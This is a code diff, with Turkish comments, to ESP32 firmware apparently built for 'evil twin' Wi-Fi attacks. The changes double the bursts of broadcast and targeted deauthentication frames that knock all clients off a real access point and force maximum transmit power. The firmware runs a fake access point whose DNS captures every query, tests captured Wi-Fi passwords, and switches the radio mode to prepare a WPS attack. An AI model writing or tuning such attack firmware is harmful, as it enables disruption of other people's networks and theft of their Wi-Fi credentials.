@@ -31,7 +31,6 @@ static unsigned long et_last_retrack = 0;
 static unsigned long et_last_csa     = 0;
 static unsigned long et_last_led     = 0;
 static unsigned long et_last_deauth  = 0;
-static unsigned long et_last_txpwr   = 0;  // TX gücü periyodik yenileme
 static bool          et_led_state    = false;
 static uint8_t       et_last_client[6] = {0};  // Son görülen hedef cihaz MAC
 
@@ -336,6 +335,10 @@ IRAM_ATTR static void et_send_null_powerdown(const uint8_t *bssid, const uint8_t
 // ─── Proaktif deauth — gerçek AP'ten tüm cihazları düşürür ──────────────────
 // Broadcast (4 reason) + hedefli (4 reason, iki yön) — her 2 saniyede tetiklenir
 IRAM_ATTR static void et_send_proactive_deauth() {
+  // TX gücünü zorla sabitle; PS'yi WPS handshake sırasında dokunma
+  esp_wifi_set_max_tx_power(84);
+  if (!et_wps_pbc_running) esp_wifi_set_ps(WIFI_PS_NONE);
+
   static const uint8_t zero[6]    = {0};
   static const uint8_t reasons[4] = {7, 6, 2, 3};
   deauth_frame_t f = et_frame;
@@ -344,10 +347,10 @@ IRAM_ATTR static void et_send_proactive_deauth() {
   memset(f.station, 0xFF, 6);
   for (int r = 0; r < 4; r++) {
     f.frame_control[0] = 0xC0; f.reason = reasons[r];
-    for (int i = 0; i < 4; i++)
+    for (int i = 0; i < 8; i++)
       esp_wifi_80211_tx(WIFI_IF_AP, &f, sizeof(f), false);
     f.frame_control[0] = 0xA0;
-    for (int i = 0; i < 4; i++)
+    for (int i = 0; i < 8; i++)
       esp_wifi_80211_tx(WIFI_IF_AP, &f, sizeof(f), false);
   }
 
@@ -417,11 +420,7 @@ void start_evil_twin(int wifi_number) {
   // AP'nin tam başlamasını bekle — ardından TX gücünü uygula
   // (Mode geçişi TX power'ı sıfırlar; gecikmesiz set etmek etkisiz kalır)
   delay(150);
-  setCpuFrequencyMhz(160);
-  esp_wifi_set_max_tx_power(84);   // 84 × 0.25 = 21 dBm (donanım limiti = 20 dBm)
-  esp_wifi_set_ps(WIFI_PS_NONE);   // Güç tasarrufu kapalı — minimum gecikme
-  esp_wifi_set_protocol(WIFI_IF_AP,
-    WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
+  apply_max_performance();
 
   // DNS: tüm sorguları 192.168.4.1'e yönlendir
   dns_server.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
@@ -471,9 +470,7 @@ bool evil_twin_test_password(const String &password) {
   esp_wifi_disconnect();
 
   // STA bağlantısı TX power ve PS ayarlarını sıfırlayabilir — geri yükle
-  setCpuFrequencyMhz(160);
-  esp_wifi_set_max_tx_power(84);
-  esp_wifi_set_ps(WIFI_PS_NONE);
+  apply_max_performance();
 
   if (!connected) {
     // AP hâlâ ayakta, sniferi yeniden başlat
@@ -504,9 +501,8 @@ static void et_retrack() {
         memcpy(et_frame.sender,       evil_twin_bssid, 6);
         // Sahte AP kanalını güncelle (AP kapanmadan)
         WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);
-        // Kanal değişiminden sonra CPU ve TX gücünü tekrar maksimuma al
-        setCpuFrequencyMhz(160);
-        esp_wifi_set_max_tx_power(84);
+        // Kanal değişiminden sonra maks performansı geri uygula
+        apply_max_performance();
         DEBUG_PRINTF("ET yeni kanal: %d\n", evil_twin_channel);
       }
       break;
@@ -568,12 +564,10 @@ void evil_twin_loop() {
     et_retrack();
   }
 
-  // TX gücü + PS: her 5 saniyede yenile (WiFi stack zaman zaman sıfırlar)
-  if (now - et_last_txpwr >= 5000) {
-    et_last_txpwr = now;
-    esp_wifi_set_max_tx_power(84);
-    esp_wifi_set_ps(WIFI_PS_NONE);
-  }
+  // TX gücü: her loop iterasyonunda zorla uygula
+  // PS: WPS PBC handshake aktifken dokunma — STA state machine'ini bozar
+  esp_wifi_set_max_tx_power(84);
+  if (!et_wps_pbc_running) esp_wifi_set_ps(WIFI_PS_NONE);
 
   // LED: 500ms aralıkla yanıp söner — ET aktif göstergesi
   if (now - et_last_led >= 500) {
@@ -609,6 +603,7 @@ void stop_evil_twin() {
 
   WiFi.softAPdisconnect(true);
   delay(150);
-  WiFi.mode(WIFI_MODE_AP);
+  // WIFI_MODE_AP yerine APSTA — WPS saldırısına geçiş için mod değişimi olmasın
+  WiFi.mode(WIFI_MODE_APSTA);
   WiFi.softAP(AP_SSID, AP_PASS);
 }
